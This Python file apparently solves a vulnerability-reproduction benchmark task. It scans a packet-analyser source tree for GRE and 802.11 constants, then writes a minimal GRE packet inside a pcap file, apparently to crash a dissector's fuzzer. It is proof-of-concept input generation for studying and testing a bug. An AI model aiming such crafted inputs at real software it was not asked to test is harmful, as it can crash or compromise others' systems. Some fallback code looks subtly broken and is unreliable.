import os
import re
import tarfile
import struct
from typing import Dict, Iterable, List, Optional, Tuple


class _SourceScanner:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._texts: Optional[List[Tuple[str, str]]] = None
        self._defines: Optional[Dict[str, str]] = None
        self._int_cache: Dict[str, Optional[int]] = {}

    @staticmethod
    def _is_text_candidate(name: str) -> bool:
        nl = name.lower()
        if any(nl.endswith(s) for s in (".c", ".h", ".cc", ".cpp", ".inc", ".l", ".y")):
            return True
        return False

    @staticmethod
    def _decode_bytes(b: bytes) -> str:
        try:
            return b.decode("utf-8", "ignore")
        except Exception:
            try:
                return b.decode("latin-1", "ignore")
            except Exception:
                return ""

    def iter_files(self, max_size: int = 2_000_000) -> Iterable[Tuple[str, str]]:
        sp = self.src_path
        if os.path.isdir(sp):
            for root, _, files in os.walk(sp):
                for fn in files:
                    path = os.path.join(root, fn)
                    rel = os.path.relpath(path, sp)
                    if not self._is_text_candidate(rel):
                        continue
                    try:
                        st = os.stat(path)
                        if st.st_size > max_size:
                            continue
                        with open(path, "rb") as f:
                            data = f.read()
                        yield rel.replace("\\", "/"), self._decode_bytes(data)
                    except Exception:
                        continue
        else:
            try:
                if tarfile.is_tarfile(sp):
                    with tarfile.open(sp, "r:*") as tf:
                        for m in tf.getmembers():
                            if not m.isfile():
                                continue
                            if m.size > max_size:
                                continue
                            name = m.name
                            if not self._is_text_candidate(name):
                                continue
                            try:
                                f = tf.extractfile(m)
                                if f is None:
                                    continue
                                data = f.read()
                                yield name, self._decode_bytes(data)
                            except Exception:
                                continue
            except Exception:
                return

    def texts(self) -> List[Tuple[str, str]]:
        if self._texts is None:
            self._texts = list(self.iter_files())
        return self._texts

    @staticmethod
    def _strip_line_comment(s: str) -> str:
        p = s.find("//")
        if p >= 0:
            return s[:p]
        return s

    @staticmethod
    def _strip_block_comments(text: str) -> str:
        # fast-ish block comment removal
        return re.sub(r"/\*.*?\*/", "", text, flags=re.S)

    def defines(self) -> Dict[str, str]:
        if self._defines is not None:
            return self._defines

        defs: Dict[str, str] = {}
        for _, txt in self.texts():
            t = self._strip_block_comments(txt)
            for line in t.splitlines():
                line = self._strip_line_comment(line).strip()
                if not line.startswith("#define"):
                    continue
                m = re.match(r"#define\s+([A-Za-z_]\w*)(\s*\(.*\))?\s+(.*)$", line)
                if not m:
                    continue
                name = m.group(1)
                if m.group(2) is not None:
                    continue  # function-like macro
                val = m.group(3).strip()
                if not val:
                    continue
                defs.setdefault(name, val)

            # Parse simple enum assignments: NAME = value
            # Keep it conservative to avoid excessive noise
            for em in re.finditer(r"\b([A-Za-z_]\w*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b", t):
                defs.setdefault(em.group(1), em.group(2))

        self._defines = defs
        return defs

    @staticmethod
    def _clean_c_int_expr(expr: str) -> str:
        expr = expr.strip()
        expr = re.sub(r"\b([0-9]+)\s*(?:[uUlL]{1,3})\b", r"\1", expr)
        expr = re.sub(r"\b(0x[0-9A-Fa-f]+)\s*(?:[uUlL]{1,3})\b", r"\1", expr)
        expr = re.sub(r"\(\s*[A-Za-z_]\w*\s*\)", "", expr)  # casts like (guint16)
        expr = re.sub(r"\s+", " ", expr)
        return expr.strip()

    def _safe_eval_int(self, expr: str) -> Optional[int]:
        expr = self._clean_c_int_expr(expr)
        if not expr:
            return None
        if len(expr) > 200:
            return None

        tokens = re.findall(r"0x[0-9A-Fa-f]+|\d+|<<|>>|[A-Za-z_]\w*|[~|&^()+\-*/]", expr)
        if not tokens:
            return None

        out = []
        for tok in tokens:
            if re.fullmatch(r"[A-Za-z_]\w*", tok):
                val = self.resolve_int(tok)
                if val is None:
                    return None
                out.append(str(val))
            else:
                out.append(tok)

        pyexpr = " ".join(out)
        if not re.fullmatch(r"[0-9xXa-fA-F\s~|&^()+\-*/<>]+", pyexpr):
            return None

        import ast

        try:
            node = ast.parse(pyexpr, mode="eval")
        except Exception:
            return None

        def eval_node(n):
            if isinstance(n, ast.Expression):
                return eval_node(n.body)
            if isinstance(n, ast.Constant) and isinstance(n.value, int):
                return n.value
            if isinstance(n, ast.UnaryOp):
                v = eval_node(n.operand)
                if v is None:
                    return None
                if isinstance(n.op, ast.Invert):
                    return ~v
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                return None
            if isinstance(n, ast.BinOp):
                l = eval_node(n.left)
                r = eval_node(n.right)
                if l is None or r is None:
                    return None
                if isinstance(n.op, ast.Add):
                    return l + r
                if isinstance(n.op, ast.Sub):
                    return l - r
                if isinstance(n.op, ast.Mult):
                    return l * r
                if isinstance(n.op, ast.FloorDiv) or isinstance(n.op, ast.Div):
                    if r == 0:
                        return None
                    return l // r
                if isinstance(n.op, ast.LShift):
                    return l << r
                if isinstance(n.op, ast.RShift):
                    return l >> r
                if isinstance(n.op, ast.BitOr):
                    return l | r
                if isinstance(n.op, ast.BitAnd):
                    return l & r
                if isinstance(n.op, ast.BitXor):
                    return l ^ r
                return None
            if isinstance(n, ast.ParenExpr):  # python 3.12+
                return eval_node(n.expression)
            return None

        try:
            val = eval_node(node)
            if not isinstance(val, int):
                return None
            return val
        except Exception:
            return None

    def resolve_int(self, name_or_expr: str) -> Optional[int]:
        key = name_or_expr.strip()
        if key in self._int_cache:
            return self._int_cache[key]

        defs = self.defines()
        if key in defs:
            v = self._safe_eval_int(defs[key])
            self._int_cache[key] = v
            return v

        v = self._safe_eval_int(key)
        self._int_cache[key] = v
        return v

    def find_gre_proto_80211(self) -> Optional[int]:
        defs = self.defines()

        # 1) Look for dissector_add_uint("gre.proto", X, <handle>) with handle hint
        best_exprs: List[str] = []
        for fname, txt in self.texts():
            if "gre.proto" not in txt:
                continue
            for m in re.finditer(
                r'dissector_add_uint(?:_with_preference)?\s*\(\s*"gre\.proto"\s*,\s*([^,]+?)\s*,\s*([A-Za-z_]\w*)',
                txt,
            ):
                key_expr = m.group(1).strip()
                handle = m.group(2)
                key_l = key_expr.lower()
                handle_l = handle.lower()
                if ("802" in key_l) or ("wlan" in key_l) or ("802" in handle_l) or ("wlan" in handle_l) or ("ieee80211" in handle_l):
                    best_exprs.append(key_expr)

        for expr in best_exprs:
            val = self.resolve_int(expr)
            if val is not None:
                return val & 0xFFFF

        # 2) Look for value_string entry mentioning IEEE 802.11 in GRE dissector
        candidates: List[str] = []
        for fname, txt in self.texts():
            fl = fname.lower()
            if "gre" not in fl:
                continue
            if "802.11" not in txt and "802_11" not in txt and "80211" not in txt and "wlan" not in txt.lower():
                continue
            for m in re.finditer(
                r"\{\s*([A-Za-z_]\w*|0x[0-9A-Fa-f]+|\d+)\s*,\s*\"[^\"]*(?:IEEE\s*)?802\.11[^\"]*\"",
                txt,
            ):
                candidates.append(m.group(1))
            for m in re.finditer(
                r"\{\s*([A-Za-z_]\w*|0x[0-9A-Fa-f]+|\d+)\s*,\s*\"[^\"]*WLAN[^\"]*\"",
                txt,
                flags=re.I,
            ):
                candidates.append(m.group(1))

        for c in candidates:
            if c in defs:
                val = self.resolve_int(c)
            else:
                val = self.resolve_int(c)
            if val is not None:
                return val & 0xFFFF

        # 3) Fallback guesses
        for guess in (0x0019, 0x0017):
            return guess

        return None

    def find_pcap_linktype_gre(self) -> Optional[int]:
        defs = self.defines()

        # direct macro
        for name in ("DLT_GRE", "LINKTYPE_GRE"):
            if name in defs:
                v = self.resolve_int(name)
                if v is not None:
                    return int(v) & 0xFFFFFFFF

        # numeric mapping to WTAP_ENCAP_GRE
        for _, txt in self.texts():
            if "WTAP_ENCAP_GRE" not in txt:
                continue

            m = re.search(r"\{\s*(\d+)\s*,\s*WTAP_ENCAP_GRE\b", txt)
            if m:
                return int(m.group(1))

            m = re.search(r"\{\s*([A-Za-z_]\w*)\s*,\s*WTAP_ENCAP_GRE\b", txt)
            if m:
                v = self.resolve_int(m.group(1))
                if v is not None:
                    return int(v) & 0xFFFFFFFF

            m = re.search(r"case\s+(\d+)\s*:\s*(?:/\*.*?\*/\s*)?return\s+WTAP_ENCAP_GRE\b", txt, flags=re.S)
            if m:
                return int(m.group(1))

            m = re.search(r"case\s+([A-Za-z_]\w*)\s*:\s*(?:/\*.*?\*/\s*)?return\s+WTAP_ENCAP_GRE\b", txt, flags=re.S)
            if m:
                v = self.resolve_int(m.group(1))
                if v is not None:
                    return int(v) & 0xFFFFFFFF

        # fallback guess often used
        return None

    def is_capture_based_fuzzer(self) -> Optional[bool]:
        saw_fuzzer = False
        for fname, txt in self.texts():
            fl = fname.lower()
            if "fuzz" not in fl and "oss-fuzz" not in fl and "fuzzer" not in fl:
                continue
            if "LLVMFuzzerTestOneInput" not in txt:
                continue
            saw_fuzzer = True
            t = txt
            if ("wtap_open" in t) or ("wiretap" in t) or ("fuzz_open_capture_file" in t) or ("wtap" in t and "open" in t):
                return True
            if ("tvb_new" in t) or ("call_dissector" in t) or ("proto_tree" in t and "epan" in t):
                return False
        if saw_fuzzer:
            return True
        return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        scanner = _SourceScanner(src_path)

        gre_proto = scanner.find_gre_proto_80211()
        if gre_proto is None:
            gre_proto = 0x0019

        flagsver = 0x0000
        gre_hdr = struct.pack(">HH", flagsver & 0xFFFF, gre_proto & 0xFFFF)
        payload = b"\x00"  # ensure non-empty payload
        gre_packet = gre_hdr + payload

        capture_based = scanner.is_capture_based_fuzzer()
        if capture_based is False:
            return gre_packet

        dlt_gre = scanner.find_pcap_linktype_gre()
        if dlt_gre is not None:
            linktype = int(dlt_gre) & 0xFFFFFFFF
            pcap_packet = gre_packet
        else:
            # fallback: DLT_RAW with IPv4(proto=GRE) + GRE
            linktype = 12  # DLT_RAW
            total_len = 20 + len(gre_packet)
            ipv4_hdr = struct.pack(
                ">BBHHHBBHII",
                0x45,  # v4, ihl=5
                0x00,  # tos
                total_len & 0xFFFF,
                0x0000,  # id
                0x0000,  # flags/frag
                0x40,  # ttl
                47,  # protocol GRE
                0x0000,  # checksum
                0x01010101,  # src
                0x02020202,  # dst
            )
            pcap_packet = ipv4_hdr + gre_packet

        global_hdr = struct.pack(
            "<IHHIIII",
            0xA1B2C3D4,  # magic (little-endian)
            2,
            4,
            0,
            0,
            65535,
            linktype,
        )
        rec_hdr = struct.pack("<IIII", 0, 0, len(pcap_packet), len(pcap_packet))
        return global_hdr + rec_hdr + pcap_packet